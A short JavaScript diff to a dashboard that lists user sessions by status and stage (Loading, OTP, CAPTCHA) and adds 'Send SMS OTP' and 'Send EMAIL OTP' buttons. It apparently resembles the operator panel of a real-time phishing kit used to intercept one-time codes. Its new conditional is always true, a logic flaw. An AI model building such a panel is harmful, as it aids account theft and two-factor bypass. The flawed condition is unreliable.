@@ -52,6 +52,8 @@ function updateConnectionsTable(users){
         } else {
             color = details.status === 'actif' ? 'success' : 'danger'; // Use success for actif, danger otherwise
         }
+
+        if(details.stage != 'Loading' || details.stage == 'OTP' || details.stage != 'CAPTCHA'){
         userDiv.innerHTML = `
        
         <h5 class="card-title fw-semibold mb-4 badge bg-${color}">${details.status}</h5>
@@ -64,11 +66,14 @@ function updateConnectionsTable(users){
           <div class="card-body">
             <h5 class="card-title">${details.page || ''}</h5>
             <p class="card-text">${details.stage || ''}</p>
-            <a href="#" class="btn btn-primary">See Result</a>
+            <a href="#" class="m-1 btn btn-primary">See Result</a>
+            <a href="#" class="m-1 btn btn-warning">Send SMS OTP</a>
+            <a href="#" class="m-1 btn btn-warning">Send EMAIL OTP</a>
           </div>
         </div>
    
         `;
+        }
 
         container.appendChild(userDiv);
     });
